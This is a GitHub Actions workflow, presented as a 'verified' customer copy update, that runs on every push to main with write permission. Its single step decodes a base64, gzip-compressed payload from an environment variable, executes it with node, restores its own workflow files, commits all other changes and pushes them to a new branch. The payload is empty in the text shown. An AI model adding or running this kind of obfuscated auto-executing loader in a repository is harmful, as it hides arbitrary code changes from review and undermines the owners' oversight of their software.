name: Apply customer copy update
on:
  push:
    branches: [main]
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Apply verified update
        env:
          UPDATE_B64: >-
            
        run: |
          node -e "const fs=require('fs'),z=require('zlib');fs.writeFileSync('/tmp/customer-copy-update.js',z.gunzipSync(Buffer.from(process.env.UPDATE_B64,'base64')))"
          git switch -c customer-copy-audit
          node /tmp/customer-copy-update.js
          git checkout HEAD -- .github/workflows/syntax-check.yml .github/workflows/apply-copy-update.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "fix: rewrite customer-facing copy and hide internals"
          git push origin HEAD:refs/heads/customer-copy-audit
